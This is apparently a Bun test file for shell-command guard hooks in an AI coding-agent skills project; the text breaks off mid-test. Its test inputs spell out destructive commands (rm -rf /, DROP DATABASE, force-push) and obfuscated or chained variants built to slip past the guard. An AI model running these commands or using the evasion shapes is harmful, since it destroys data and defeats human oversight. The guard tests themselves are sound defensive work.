import { describe, test, expect } from 'bun:test';
import { spawnSync } from 'child_process';
import * as path from 'path';
import * as fs from 'fs';
import * as os from 'os';
import { usePrivateStateRoot } from './helpers/private-state-root';
import { gitArgvIn } from './helpers/scratch-repo';

const ROOT = path.resolve(import.meta.dir, '..');
usePrivateStateRoot();
const CAREFUL_SCRIPT = path.join(ROOT, 'careful', 'bin', 'check-careful.sh');
const FREEZE_SCRIPT = path.join(ROOT, 'freeze', 'bin', 'check-freeze.sh');

function runHook(scriptPath: string, input: object, env?: Record<string, string>, cwd?: string): { exitCode: number; output: any; raw: string } {
  const result = spawnSync('bash', [scriptPath], {
    input: JSON.stringify(input),
    stdio: ['pipe', 'pipe', 'pipe'],
    env: { ...process.env, ...env },
    cwd,
    timeout: 5000,
  });
  const raw = result.stdout.toString().trim();
  let output: any = {};
  try {
    output = JSON.parse(raw);
  } catch {}
  return { exitCode: result.status ?? 1, output, raw };
}

// Scratch git repo with a resolvable origin default branch — the HIGH-tier
// force-push check reads `git symbolic-ref refs/remotes/origin/HEAD` from the
// hook's cwd, and Conductor worktrees don't reliably carry that ref.
function withGitRepo(defaultBranch: string, currentBranch: string, fn: (repoDir: string) => void) {
  const repoDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-careful-git-'));
  try {
    const git = (args: string[]) => gitArgvIn(repoDir, args);
    git(['init', '-q', '-b', defaultBranch]);
    git(['commit', '--allow-empty', '-q', '-m', 'init']);
    // A symbolic ref may dangle; the hook only reads its NAME.
    git(['symbolic-ref', 'refs/remotes/origin/HEAD', `refs/remotes/origin/${defaultBranch}`]);
    if (currentBranch !== defaultBranch) git(['checkout', '-q', '-b', currentBranch]);
    fn(repoDir);
  } finally {
    fs.rmSync(repoDir, { recursive: true, force: true });
  }
}

function runHookRaw(scriptPath: string, rawInput: string, env?: Record<string, string>): { exitCode: number; output: any; raw: string } {
  const result = spawnSync('bash', [scriptPath], {
    input: rawInput,
    stdio: ['pipe', 'pipe', 'pipe'],
    env: { ...process.env, ...env },
    timeout: 5000,
  });
  const raw = result.stdout.toString().trim();
  let output: any = {};
  try {
    output = JSON.parse(raw);
  } catch {}
  return { exitCode: result.status ?? 1, output, raw };
}

function carefulInput(command: string) {
  return { tool_input: { command } };
}

function freezeInput(filePath: string) {
  return { tool_input: { file_path: filePath } };
}

function withFreezeDir(freezePath: string, fn: (stateDir: string) => void) {
  const stateDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-freeze-test-'));
  fs.writeFileSync(path.join(stateDir, 'freeze-dir.txt'), freezePath);
  try {
    fn(stateDir);
  } finally {
    fs.rmSync(stateDir, { recursive: true, force: true });
  }
}

// The freeze WRITER resolves its state root through bin/gstack-paths, which
// trusts CLAUDE_PLUGIN_DATA only when CLAUDE_PLUGIN_ROOT names gstack; the
// reader mirrors that exact chain (#1459 / #1509). A test standing in for a
// plugin install must supply both, and must neutralize a GSTACK_HOME inherited
// from the shard's process.env (an empty value reads as unset in ${VAR:-}).
function freezeEnv(stateDir: string, extra: Record<string, string> = {}): Record<string, string> {
  return { GSTACK_HOME: '', CLAUDE_PLUGIN_DATA: stateDir, CLAUDE_PLUGIN_ROOT: '/plugins/gstack', ...extra };
}

const HOOK_EXTRACT = path.join(ROOT, 'careful', 'bin', 'hook-extract.sh');
const GSTACK_PATHS = path.join(ROOT, 'bin', 'gstack-paths');

/** What the hook helper resolves as the state root under a given env. */
function hookStateRoot(env: Record<string, string>): string {
  const r = spawnSync('bash', ['-c', `. "${HOOK_EXTRACT}" && gstack_hook_state_root`], {
    env: { PATH: process.env.PATH ?? '', ...env }, encoding: 'utf-8', timeout: 5000,
  });
  return r.stdout.trim();
}

/** What bin/gstack-paths resolves as GSTACK_STATE_ROOT under the same env. */
function pathsStateRoot(env: Record<string, string>): string {
  const r = spawnSync('bash', ['-c', `eval "$("${GSTACK_PATHS}")" && printf '%s' "$GSTACK_STATE_ROOT"`], {
    env: { PATH: process.env.PATH ?? '', ...env }, encoding: 'utf-8', timeout: 5000,
  });
  return r.stdout.trim();
}

// ============================================================
// Frontmatter hook wiring (#2469 / #1871)
// ============================================================
// Frontmatter hooks run before any runtime variable exists, so a
// ${CLAUDE_SKILL_DIR}-relative command silently never resolves and the guard
// never fires. Every command: line must anchor on $HOME like careful/freeze.
function withEmptyDir(fn: (dir: string) => void) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-hook-empty-'));
  try { fn(dir); } finally { fs.rmSync(dir, { recursive: true, force: true }); }
}

describe('frontmatter hook command paths', () => {
  test.each(['investigate/SKILL.md', 'careful/SKILL.md', 'freeze/SKILL.md', 'guard/SKILL.md'])(
    '%s hook commands are $HOME-anchored, never CLAUDE_SKILL_DIR',
    (rel) => {
      const content = fs.readFileSync(path.join(ROOT, rel), 'utf-8');
      const commandLines = content.split('\n').filter((l) => l.trim().startsWith('command:'));
      expect(commandLines.length).toBeGreaterThan(0);
      for (const line of commandLines) {
        expect(line).not.toContain('CLAUDE_SKILL_DIR');
        expect(line).toContain('$HOME/.claude/skills/gstack/');
      }
    },
  );
});

// Claude Code fires a hook only for the tools its matcher names. The
// PowerShell tool is the primary shell on Windows (and the only one without
// Git Bash), and NotebookEdit edits files without a file_path (#3067).
function hookCommandsFor(rel: string, matcher: string): string[] {
  const content = fs.readFileSync(path.join(ROOT, rel), 'utf-8');
  const frontmatter = content.split('\n---')[0];
  const blocks = frontmatter.split('    - matcher: ').slice(1);
  return blocks
    .filter((b) => b.startsWith(`"${matcher}"`))
    .flatMap((b) => b.split('\n').filter((l) => l.trim().startsWith('command:')));
}

describe('generated hook matchers cover PowerShell and NotebookEdit (#3067)', () => {
  test.each(['careful/SKILL.md', 'guard/SKILL.md'])('%s routes Bash and PowerShell to check-careful.sh', (rel) => {
    for (const matcher of ['Bash', 'PowerShell']) {
      const commands = hookCommandsFor(rel, matcher);
      expect(commands.length).toBe(1);
      expect(commands[0]).toContain('careful/bin/check-careful.sh');
    }
  });

  test.each(['freeze/SKILL.md', 'guard/SKILL.md', 'investigate/SKILL.md'])('%s routes Edit, Write and NotebookEdit to check-freeze.sh', (rel) => {
    for (const matcher of ['Edit', 'Write', 'NotebookEdit']) {
      const commands = hookCommandsFor(rel, matcher);
      expect(commands.length).toBe(1);
      expect(commands[0]).toContain('freeze/bin/check-freeze.sh');
    }
  });

  test('careful/SKILL.md says PowerShell coverage is best-effort and points to permission deny rules', () => {
    const content = fs.readFileSync(path.join(ROOT, 'careful', 'SKILL.md'), 'utf-8');
    expect(content).toContain('**Best-effort on PowerShell.**');
    expect(content).toContain('"PowerShell(Remove-Item *)"');
  });
});

// ============================================================
// check-careful.sh tests
// ============================================================
describe('check-careful.sh', () => {

  // --- Destructive rm commands ---

  describe('rm -rf / rm -r', () => {
    test('rm -rf /var/data warns with recursive delete message', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -rf /var/data'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });

    test('rm -r ./some-dir warns', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -r ./some-dir'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });

    test('rm -rf node_modules allows (safe exception)', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -rf node_modules'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });

    test('rm -rf .next dist allows (multiple safe targets)', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -rf .next dist'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });

    test('rm -rf node_modules /var/data warns (mixed safe+unsafe)', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -rf node_modules /var/data'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });

    // The safe exception matches the COMPLETE command against an anchored
    // whitelist shape — anything else (chains, comments, substitution) falls
    // through to the destructive-pattern warning.
    test('rm -rf /; rm -rf node_modules warns (semicolon chain, dangerous first)', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -rf /; rm -rf node_modules'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });

    test('rm -rf /etc/data && rm -rf dist warns (&& chain, dangerous first)', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -rf /etc/data && rm -rf dist'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });

    test('rm -rf node_modules; rm -rf /home/user/data warns (safe first, dangerous last)', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -rf node_modules; rm -rf /home/user/data'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });

    // Command substitution can end in a whitelisted suffix while running
    // anything inside $(...) or backticks — the whitelist's target tokens
    // exclude `(` and backtick so these cannot ride the safe exception.
    test('rm -rf $(./wipe-all)/node_modules warns (command substitution)', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -rf $(./wipe-all)/node_modules'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });

    test('rm -rf `./wipe-all`/node_modules warns (backtick substitution)', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -rf `./wipe-all`/node_modules'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });

    // Capital -R is the documented recursive flag on BSD rm (macOS) and accepted
    // by GNU rm. Both greps previously required a lowercase r, so `rm -R /`
    // silently allowed. A bare recursive delete of / is now HIGH-tier: denied,
    // not asked.
    test('rm -R / denies (HIGH tier: recursive delete of root)', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -R /'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('HIGH');
    });

    test('rm -fR /home/user warns (capital R in flag cluster)', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -fR /home/user'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });

    test('rm -Rf node_modules allows (capital R, single safe target)', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -Rf node_modules'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });

    // The old grep extractor stopped at the first escaped quote in the JSON
    // string, so any quoted argument truncated the command BEFORE the pattern
    // checks ran — hiding everything after it. (#2426)
    test.each([
      'git commit -m "wip" && rm -rf /',
      'bash -c "rm -rf /"',
      'echo "x"; rm -rf ~',
      'npm run build --msg "done" && rm -rf /',
    ])('a quoted argument cannot hide a later destructive command: %s', (command) => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(command));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });

    // JSON-escaped newline (literal two-char \n surviving the grep extraction
    // path) breaks the anchored whitelist shape → falls through to the warn.
    test('newline-chained rm warns (escaped-newline separator branch)', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -rf /etc/x\nrm -rf node_modules'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });

    // Deliberate false positive, pinned: a safe-prefix chain ending in a safe rm
    // is indistinguishable from the dangerous-first exploit shape without real
    // shell parsing, so warn-on-all-chains is the designed fail-closed direction.
    // A future per-segment parser must consciously change this test.
    test('cd app && rm -rf node_modules asks (fail-closed on chains, by design)', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('cd app && rm -rf node_modules'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });

    test.each([
      'rm -rf /; rm -rf node_modules',
      'rm -rf / && rm -rf node_modules',
      'rm -rf / # rm -rf node_modules',
      'rm -rf node_modules; rm -rf /',
      'rm -rf node_modules || rm -rf /',
      'echo ok && rm -rf /',
      'rm -rf node_modules\nrm -rf /',
    ])('never lets a safe-looking target hide a destructive command: %s', (command) => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(command));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });
  });

  test.each([
    ['rm -rf node_modules\nrm -rf /', 'recursive delete'],
    ['rm${IFS}-rf${IFS}/', 'obfuscation'],
    ['psql -c "DROP DATABASE production"', 'SQL DROP'],
    ['psql -c "TRUNCATE users"', 'SQL TRUNCATE'],
    ['git push --force origin feature', 'force-push'],
    ['git reset --hard', 'reset --hard'],
    ['git restore .', 'uncommitted changes'],
    ['kubectl delete pod app', 'kubectl delete'],
    ['docker system prune', 'Docker'],
  ])('keeps %s visible before large multiline content', (command, reason) => {
    const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(`${command}\n# ${'x'.repeat(100_000)}`));
    expect(exitCode).toBe(0);
    expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
    expect(output.hookSpecificOutput?.permissionDecisionReason).toContain(reason);
  });

  // --- Commit message false positives (#1060) ---

  describe('commit message false positives (#1060)', () => {
    // Quoted -m content describes destructive patterns but does not run them.
    test.each([
      'git commit -m "fix: prevent accidental drop table in migration"',
      'git commit -m "docs: explain truncate vs delete semantics"',
      'git commit -m "feat: add guard for recursive delete patterns"',
      'git add . && git commit -m "fix: handle drop database edge case"',
    ])('does not warn on descriptive text in commit message: %s', (command) => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(command));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });

    // Real destructive commands chained with a commit still warn.
    test('warns when a real DROP TABLE follows git commit in a chain', () => {
      const { exitCode, output } = runHook(
        CAREFUL_SCRIPT,
        carefulInput('git commit -m "release" && psql -c "DROP TABLE staging"'),
      );
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('SQL DROP');
    });

    test('warns when a real TRUNCATE follows git commit in a chain', () => {
      const { exitCode, output } = runHook(
        CAREFUL_SCRIPT,
        carefulInput('git commit -m "cleanup" && psql -c "TRUNCATE audit_log"'),
      );
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('SQL TRUNCATE');
    });

    // Quote-aware awk scanner: a single-quoted message whose content looks like
    // a flag boundary must not swallow real commands that follow via &&.
    test('warns when rm follows a single-quoted message that embeds a double-quote', () => {
      const { exitCode, output } = runHook(
        CAREFUL_SCRIPT,
        carefulInput(`git commit -m 'note -m "' && rm -rf build && echo '"'`),
      );
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });

    // A double-quoted message containing $(...) is not masked — the substitution
    // content remains visible to the MEDIUM checks.
    test('warns when a commit message contains a command substitution with rm', () => {
      const { exitCode, output } = runHook(
        CAREFUL_SCRIPT,
        carefulInput('git commit -m "$(rm -rf build)"'),
      );
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });

    // A force-push chained after a commit must still warn even after the message is masked.
    test('warns on force-push chained after git commit', () => {
      const { exitCode, output } = runHook(
        CAREFUL_SCRIPT,
        carefulInput('git commit -m "x" && git push --force'),
      );
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('force-push');
    });

    // -am shorthand: the message is masked, so "drop table" in the message text
    // does not trigger the SQL DROP warning.
    test('does not warn on drop-table text in -am commit message', () => {
      const { exitCode, output } = runHook(
        CAREFUL_SCRIPT,
        carefulInput('git commit -am "drop table notes"'),
      );
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });

    // bash 3.2 (macOS /bin/bash) mis-parses quote characters in a heredoc
    // inside $( ), so the awk program inline made the whole hook a syntax error
    // there. It is a file beside the hook, read with awk -f.
    test('the masking program is a file beside the hook, not a heredoc inside $( )', () => {
      const source = fs.readFileSync(CAREFUL_SCRIPT, 'utf8');
      expect(source).not.toMatch(/\$\(cat <</);
      expect(source).toContain('awk -f "$_MASK_AWK"');
      expect(fs.existsSync(path.join(path.dirname(CAREFUL_SCRIPT), 'mask-commit-message.awk'))).toBe(true);
    });

    // Newlines separate commands, and quote state carries across them. The
    // per-line scanner joined lines (`-m xtruncate`) and restarted quote
    // state on every line, so a quoted line break could hide a real command.
    test.each([
      ['git commit -m x\ntruncate -s 0 f', 'SQL TRUNCATE'],
      ['git commit -m wip\nrm -rf build', 'recursive delete'],
      ["git commit -m \"a\n-m 'x\" && rm -rf build && echo '", 'recursive delete'],
    ])('a command on the next line still asks: %j', (command, reason) => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(command));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain(reason);
    });

    test('a multi-line quoted message is masked as one message', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git commit -m "fix: guard migrations\n\nNo more drop table in the seed script."'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });

    // Only git commit's own message is masked: a -m argument of another
    // command in the chain, a commit whose output is piped into a shell, and
    // an escaped quote inside the message all stay visible.
    test.each([
      ["git commit -m a && ls | parallel -m 'rm -rf build'", 'recursive delete'],
      ["git commit -m 'rm -rf build' | sh", 'recursive delete'],
      ["echo git commit -m 'drop table users'", 'SQL DROP'],
      ['git commit -m "a\\"b" && rm -rf build', 'recursive delete'],
      ["git commit -m wip \\\n&& rm -rf build", 'recursive delete'],
    ])('text outside commit\'s own message still asks: %j', (command, reason) => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(command));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain(reason);
    });

    test.each([
      'git -C repo commit --message="docs: truncate the changelog intro"',
      "git commit --message 'chore: drop database fixtures from the seed'",
      "git commit --amend -m 'fix: git reset --hard in the docs'",
    ])('commit\'s own message is masked in every flag form: %s', (command) => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(command));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });

    // The form agents use most: a quoted-delimiter heredoc inside "$( )". Its
    // body is never expanded, so it is masked whole. Any other substitution,
    // backtick, $'...' or heredoc leaves the command unmasked.
    const heredocMessage = (body: string, delimiter = "'EOF'", end = 'EOF') =>
      `git commit -m "$(cat <<${delimiter}\n${body}\n${end}\n)"`;
    test.each([
      heredocMessage('fix: guard the migration that could drop table users\n\nCo-Authored-By: A <a@example.com>'),
      heredocMessage('docs: why we never truncate "audit" rows (see #12)'),
      heredocMessage('chore: git reset --hard is documented', '"MSG"', 'MSG'),
      heredocMessage('chore: rm -rf build in the clean script', "-'EOF'", '\tEOF'),
    ])('a quoted-delimiter heredoc message is masked: %j', (command) => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(command));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });

    test.each([
      [heredocMessage('docs: drop table notes') + ' && git push --force', 'force-push'],
      [heredocMessage('drop table $(rm -rf build)', 'EOF'), 'recursive delete'],
      [`git commit -m "$(echo " -m 'x" ; rm -rf build ; echo ')"`, 'recursive delete'],
      ['git commit -m "\`rm -rf build\`"', 'recursive delete'],
      ["git commit -F - <<'EOF'\ndocs: drop table notes\nEOF", 'SQL DROP'],
      ["git commit -m $'drop table notes\\n'", 'SQL DROP'],
    ])('other substitutions and heredocs stay unmasked: %j', (command, reason) => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(command));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain(reason);
    });

    // git prints the message on stdout, so any pipe after a masked message,
    // a process substitution or a parameter expansion leaves it unmasked; a
    // redirection's & is not a separator, and a comment's quote is not a quote.
    test.each([
      "git commit -m 'rm -rf build' 2>&1 | sh",
      "(git commit -m 'rm -rf build') | sh",
      "git commit -m 'rm -rf build' > >(sh)",
      'git commit -m "${MSG:-rm -rf build}"',
    ])('a message that can reach a shell stays unmasked: %j', (command) => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(command));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });

    test.each([
      "git commit -m 'drop table notes' 2>&1 && git log -1 --oneline",
      "git commit -m 'drop table notes' || echo failed",
      "git commit -m 'drop table notes' # it's the docs commit",
    ])('redirections, || and comments keep the message masked: %j', (command) => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(command));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });

    test('a partial install without the masking program still asks on the message text', () => {
      const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-careful-nomask-'));
      try {
        for (const file of ['check-careful.sh', 'hook-extract.sh']) {
          fs.copyFileSync(path.join(path.dirname(CAREFUL_SCRIPT), file), path.join(dir, file));
        }
        const { exitCode, output } = runHook(path.join(dir, 'check-careful.sh'), carefulInput('git commit -m "drop table notes"'));
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('SQL DROP');
      } finally {
        fs.rmSync(dir, { recursive: true, force: true });
      }
    });
  });

  // --- Shell obfuscation ---

  describe('shell obfuscation', () => {
    test.each([
      'rm${IFS}-rf${IFS}/',
      'rm$IFS-rf$IFS/',
      'echo cm0gLXJmIC8= | base64 -d | sh',
    ])('asks when the command hides its shape behind expansion: %s', (command) => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(command));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('obfuscation');
    });

    test('ordinary commands are unaffected', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('cat file.b64 | base64 -d > out.bin'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });
  });

  // --- JSON payload extraction ---

  describe('command extraction', () => {
    test('fails closed when the payload is not valid JSON', () => {
      const { exitCode, output } = runHookRaw(CAREFUL_SCRIPT, 'this is not json');
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('parse');
    });

    test('allows a well-formed payload with no command field', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, { tool_input: { file_path: '/tmp/x' } });
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });

    test('allows when command is present but not a string', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, { tool_input: { command: 42 } });
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });

    test('preserves escaped quotes in the extracted command', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('echo "hello world"'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });
  });

  // --- SQL destructive commands ---
  // Embedded double quotes are now safe to use here. They previously truncated the
  // extracted command (the grep-based extractor stopped at the first \"), which hid
  // the SQL keyword from the pattern matcher — so the older tests had to be written
  // without quotes, in a shape no one actually types. The JSON-parser extraction
  // fixed that, and the quoted forms below are the realistic ones.

  describe('SQL destructive commands', () => {
    test('psql DROP TABLE warns with DROP in message', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('psql -c DROP TABLE users;'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('DROP');
    });

    test.each([
      'psql -c "DROP TABLE users"',
      'psql -c "TRUNCATE orders"',
      'mysql -e "DROP DATABASE prod"',
    ])('a quoted SQL statement is still inspected: %s', (command) => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(command));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
    });

    test('mysql drop database warns (case insensitive)', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('mysql -e drop database mydb'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason.toLowerCase()).toContain('drop');
    });

    test('psql TRUNCATE warns', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('psql -c TRUNCATE orders;'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('TRUNCATE');
    });
  });

  // --- Git destructive commands ---

  describe('git destructive commands', () => {
    // Force-push to a NON-default branch is MEDIUM (ask). Force-push to the
    // default branch is HIGH (deny) — covered in the HIGH tier describe. The
    // fixture repo pins the default branch so the split is deterministic
    // regardless of the host repo's origin/HEAD.
    test('git push --force warns with force-push (non-default target)', () => {
      withGitRepo('trunk', 'trunk', (repoDir) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git push --force origin main'), undefined, repoDir);
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('force-push');
      });
    });

    test('git push -f warns (non-default target)', () => {
      withGitRepo('trunk', 'trunk', (repoDir) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git push -f origin main'), undefined, repoDir);
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('force-push');
      });
    });

    test('git reset --hard warns with uncommitted', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git reset --hard HEAD~3'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('uncommitted');
    });

    test('git checkout . warns', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git checkout .'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('uncommitted');
    });

    test('git restore . warns', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git restore .'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('uncommitted');
    });
  });

  // --- Container / infra destructive commands ---

  describe('container and infra commands', () => {
    test('kubectl delete warns with kubectl in message', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('kubectl delete pod my-pod'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('kubectl');
    });

    test('docker rm -f warns', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('docker rm -f container123'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('Docker');
    });

    test('docker system prune -a warns', () => {
